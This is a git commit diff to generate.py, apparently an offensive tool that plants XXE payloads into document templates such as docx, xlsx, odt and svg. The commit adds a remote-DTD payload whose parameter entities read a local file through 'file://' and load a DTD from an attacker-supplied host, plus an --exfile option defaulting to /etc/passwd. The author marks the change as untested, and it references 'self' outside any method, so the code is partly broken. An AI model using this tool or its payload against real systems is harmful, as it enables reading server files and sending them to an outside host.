8de92019287da9a54aee51831cfde0e8db4d3136
Mantis <rclifford@cybershade.org>
2019-07-25 16:43:37 +0100

    Untested! Apologies if it's broken :>

--- generate.py
+++ generate.py
@@ -2,26 +2,30 @@ import argparse
 
 payloads = {
     "rdtd": {
-        "payload": '<!DOCTYPE roottag PUBLIC "-//OXML/XXE/EN" "IP/FILE">',
         "description": "A Remote DTD causes the XML parser to make an external connection when successful.",
+        "payload": '<!DOCTYPE root [ <!ENTITY % start "<![CDATA["><!ENTITY % stuff SYSTEM "file://{0}"><!ENTITY % end "]]>"><!ENTITY % dtd SYSTEM "{1}://{2}">%dtd;]>'.format(
+            self.exfile, 
+            self.protocol + self.host
+        ),
+        "entity": "&xxe;",
     }
 }
 
 filetypes = {
-    "docx": "samples/template.docx",
+    "docx": "samples/docx/template.docx",
+    "xlsx": "samples/xlsx/template.xlsx",
     "odg": "samples/template.odg",
     "odp": "samples/template.odp",
     "ods": "samples/template.ods",
     "odt": "samples/template.odt",
     "pptx": "samples/template.pptx",
     "svg": "samples/template.svg",
-    "xlsx": "samples/template.xlsx",
     "xml": "samples/template.xml",
 }
 
 
 class XXeFile:
-    def __init__(self, host, protocol, filetype, payload, outfile=None):
+    def __init__(self, host, protocol, filetype, payload, outfile=None, exfile=None):
         if not host:
             raise KeyError("Please specify a valid host")
         if not protocol:
@@ -30,10 +34,13 @@ class XXeFile:
             raise KeyError("Please specify a valid filetype")
         if not payload:
             raise KeyError("Please specify a valid payload")
+        if not exfile:
+            exfile = "/etc/passwd" 
         if not filetype in filetypes:
             raise KeyError("Please specify a valid filetype")
         if not payload in payloads:
             raise KeyError("Please specify a valid payload")
+
         self.host = host
         self.protocol = protocol
         self.filetype = filetype
@@ -41,6 +48,7 @@ class XXeFile:
         self.payload = payloads[payload]["payload"]
         self.description = payloads[payload]["description"]
         self.outfile = outfile
+        self.exfile = exfile
 
     def generate_payload(self):
         with open(self.template, "rb") as tmpl:
@@ -86,10 +94,13 @@ def main():
     parser.add_argument(
         "--outfile", type=str, help="The outfile to use in your outfiles"
     )
+    parser.add_argument(
+        "--exfile", type=str, required=False, help="The file you want to extract"
+    )
     args = parser.parse_args()
 
     obj = XXeFile(
-        args.host, args.protocol, args.type, args.payload, args.outfile
+        args.host, args.protocol, args.type, args.payload, args.outfile, args.exfile
     )
 
     print(obj.host, obj.protocol, obj.payload, obj.template)
